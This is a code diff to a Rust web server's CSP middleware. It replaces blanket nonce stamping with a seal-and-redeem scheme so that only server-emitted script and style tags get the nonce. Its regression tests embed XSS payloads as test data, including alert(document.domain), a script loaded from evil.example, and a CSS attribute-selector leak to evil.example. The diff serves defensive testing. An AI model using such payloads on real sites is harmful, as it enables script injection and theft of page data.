@@ -91,30 +91,6 @@ fn generate_nonce() -> String {
     }
 }
 
-/// Stamp `nonce="…"` onto every parser-inserted `<script>` opening tag in an
-/// HTML body. Two non-overlapping passes — attributed tags (`<script src=…>`,
-/// `<script defer>`, `<script type=…>`) first, then the attribute-less
-/// `<script>` — so neither re-matches the other's output, and `</script>` is
-/// never touched. The CSP is `'strict-dynamic'`, so any further scripts these
-/// trusted ones go on to inject (e.g. into HTMX-swapped fragments) are admitted
-/// without a nonce of their own.
-fn inject_script_nonce(html: &str, nonce: &str) -> String {
-    html.replace("<script ", &format!("<script nonce=\"{nonce}\" "))
-        .replace("<script>", &format!("<script nonce=\"{nonce}\">"))
-}
-
-/// Stamp `nonce="…"` onto every parser-inserted `<style>` opening tag, the
-/// `style-src` counterpart of [`inject_script_nonce`]. Style **attributes**
-/// (`style="…"`) cannot carry a nonce, so they are eliminated in the renderers;
-/// only `<style>` **elements** are nonceable, and this admits exactly the ones
-/// our own page renderers emit. Unlike scripts there is no `'strict-dynamic'`
-/// for styles, so this only covers full-document renders — an HTMX-swapped
-/// fragment is inserted under the *host page's* nonce and cannot match its own.
-fn inject_style_nonce(html: &str, nonce: &str) -> String {
-    html.replace("<style ", &format!("<style nonce=\"{nonce}\" "))
-        .replace("<style>", &format!("<style nonce=\"{nonce}\">"))
-}
-
 /// The CSSOM applier that lets computed styles ride a `data-style` attribute
 /// instead of a (now CSP-forbidden) inline `style=""`. It writes each
 /// declaration onto `element.style` via `setProperty`, which CSP does not
@@ -129,7 +105,8 @@ fn inject_style_nonce(html: &str, nonce: &str) -> String {
 /// the same failure mode the per-request nonce design avoids for scripts.
 /// HTMX fragment responses (no `</body>`) are left alone; their host page's
 /// applier styles them on swap.
-const DYN_STYLE_APPLIER: &str = r"<script>
+static DYN_STYLE_APPLIER: crate::seal::Sealed = crate::seal::Sealed::new(
+    r"<script>
 (function () {
   function apply(el) {
     var d = el.getAttribute('data-style');
@@ -150,14 +127,22 @@ const DYN_STYLE_APPLIER: &str = r"<script>
   walk(document);
   if (document.body) document.body.addEventListener('htmx:afterSwap', function (e) { walk(e.target); });
 })();
-</script>";
+</script>",
+);
 
 /// Insert [`DYN_STYLE_APPLIER`] just before `</body>` of a full document. HTMX
 /// fragments carry no `</body>`, so they pass through untouched.
 fn inject_dyn_style_applier(html: &str) -> String {
     html.rfind("</body>").map_or_else(
         || html.to_string(),
-        |pos| format!("{}{}{}", &html[..pos], DYN_STYLE_APPLIER, &html[pos..]),
+        |pos| {
+            format!(
+                "{}{}{}",
+                &html[..pos],
+                DYN_STYLE_APPLIER.as_str(),
+                &html[pos..]
+            )
+        },
     )
 }
 
@@ -272,11 +257,11 @@ pub async fn security_headers_middleware(req: Request, next: Next) -> Response {
                 let html = String::from_utf8_lossy(&bytes);
                 // Suppress htmx's un-nonceable indicator <style> (its rules are
                 // already in app.css), then add the data-style applier; its
-                // <script> is nonced by the pass below like any other.
+                // <script> is sealed, so the pass below nonces it like any other.
                 let configured = inject_htmx_config(html.as_ref());
                 let with_applier = inject_dyn_style_applier(&configured);
-                let scripted = inject_script_nonce(&with_applier, &nonce);
-                let stamped = inject_style_nonce(&scripted, &nonce);
+                // Only tags this server sealed take the nonce; see `seal`.
+                let stamped = crate::seal::redeem(&with_applier, &nonce);
                 // The base-path prefix rides this pass rather than making its
                 // own: the body is already buffered and already walked, so the
                 // rewrite is free, and every page written after this change
@@ -410,28 +395,104 @@ fn authority_matches(url: &str, host: &str) -> bool {
 mod tests {
     use super::*;
 
-    #[test]
-    fn inject_script_nonce_stamps_each_opening_tag_once() {
-        let html = concat!(
-            r#"<script src="/a.js"></script>"#,
-            r#"<script>x()</script>"#,
-            r#"<script defer src="/b.js"></script>"#,
-        );
-        let out = inject_script_nonce(html, "ABC");
-        // Every opening tag stamped exactly once — and never double-stamped.
-        assert_eq!(out.matches(r#"nonce="ABC""#).count(), 3);
-        assert!(!out.contains(r#"nonce="ABC" nonce="#));
-        assert!(out.contains(r#"<script nonce="ABC" src="/a.js">"#));
-        assert!(out.contains(r#"<script nonce="ABC">x()"#));
-        assert!(out.contains(r#"<script nonce="ABC" defer src="/b.js">"#));
-        // Close tags are left alone.
-        assert_eq!(out.matches("</script>").count(), 3);
+    /// Serve `body` through the real middleware and return the response text
+    /// and its `Content-Security-Policy`.
+    async fn through_the_middleware(body: String) -> (String, String) {
+        use axum::routing::get;
+        use tower::ServiceExt as _;
+        let app = axum::Router::new()
+            .route(
+                "/",
+                get(move || {
+                    let body = body.clone();
+                    async move { axum::response::Html(body) }
+                }),
+            )
+            .layer(axum::middleware::from_fn(security_headers_middleware));
+        let res = app
+            .oneshot(
+                Request::builder()
+                    .uri("/")
+                    .body(axum::body::Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        let csp = res
+            .headers()
+            .get(header::CONTENT_SECURITY_POLICY)
+            .and_then(|v| v.to_str().ok())
+            .unwrap_or_default()
+            .to_owned();
+        let bytes = axum::body::to_bytes(res.into_body(), usize::MAX)
+            .await
+            .unwrap();
+        (String::from_utf8_lossy(&bytes).into_owned(), csp)
     }
 
-    #[test]
-    fn inject_script_nonce_leaves_non_script_markup_unchanged() {
-        let html = "<p>hi</p><div data-x=\"scripted\">no tags here</div>";
-        assert_eq!(inject_script_nonce(html, "N"), html);
+    fn nonce_of(csp: &str) -> &str {
+        csp.split("'nonce-")
+            .nth(1)
+            .and_then(|r| r.split('\'').next())
+            .unwrap()
+    }
+
+    /// The defect: a visitor's text that reached the page unescaped used to be
+    /// stamped with the nonce, because the pass could not tell it from ours.
+    #[tokio::test]
+    async fn a_script_reflected_into_a_page_does_not_come_out_as_a_script() {
+        let ours = crate::seal::seal("<script>ours()</script>");
+        let reflected = r#"</title><script>alert(document.domain)</script><script src="//evil.example/x.js"></script>"#;
+        let (html, csp) =
+            through_the_middleware(format!("<html><body>{ours}{reflected}</body></html>")).await;
+        let nonce = nonce_of(&csp);
+        assert!(
+            html.contains(&format!("<script nonce=\"{nonce}\">ours()")),
+            "our own script lost its nonce: {html}"
+        );
+        // Text, not a tag: htmx re-creates the scripts of a swapped fragment and
+        // `'strict-dynamic'` admits those without a nonce, so "left bare" is
+        // not enough.
+        assert!(
+            html.contains("&lt;script>alert(document.domain)"),
+            "the reflected script must come out as text: {html}"
+        );
+        assert!(
+            html.contains(r#"&lt;script src="//evil.example/x.js">"#),
+            "{html}"
+        );
+        assert!(
+            !html.contains("<script>alert") && !html.contains("<script src="),
+            "{html}"
+        );
+        // Our one script, plus the style applier the middleware adds: nothing else.
+        assert_eq!(
+            html.matches(&format!("nonce=\"{nonce}\"")).count(),
+            2,
+            "{html}"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_style_reflected_into_a_page_is_not_given_the_nonce() {
+        let ours = crate::seal::seal("<style>.ours{}</style>");
+        let reflected = "<style>input[value^=a]{background:url(https://evil.example/a)}</style>";
+        let (html, csp) =
+            through_the_middleware(format!("<html><body>{ours}{reflected}</body></html>")).await;
+        let nonce = nonce_of(&csp);
+        assert!(
+            html.contains(&format!("<style nonce=\"{nonce}\">.ours")),
+            "{html}"
+        );
+        assert!(html.contains("<style>input[value^=a]"), "{html}");
+    }
+
+    #[tokio::test]
+    async fn the_seal_never_reaches_the_browser() {
+        let ours = crate::seal::seal("<script>a()</script><script src=\"/s.js\"></script>");
+        let (html, _) =
+            through_the_middleware(format!("<html><head></head><body>{ours}</body></html>")).await;
+        assert!(!html.contains("data-bnb-seal"), "{html}");
     }
 
     #[test]
@@ -444,20 +505,6 @@ mod tests {
         // our own full-page blocks, admitted by this nonce.
         assert!(csp.contains("style-src 'self' 'nonce-XYZ'"));
         assert!(!csp.contains("'unsafe-inline'"));
-    }
-
-    #[test]
-    fn inject_style_nonce_stamps_each_opening_tag_once() {
-        let html = concat!(
-            r#"<style>.a{color:red}</style>"#,
-            r#"<style type="text/css">.b{color:blue}</style>"#,
-        );
-        let out = inject_style_nonce(html, "ABC");
-        assert_eq!(out.matches(r#"nonce="ABC""#).count(), 2);
-        assert!(out.contains(r#"<style nonce="ABC">.a"#));
-        assert!(out.contains(r#"<style nonce="ABC" type="text/css">.b"#));
-        // Close tags are left alone.
-        assert_eq!(out.matches("</style>").count(), 2);
     }
 
     #[test]
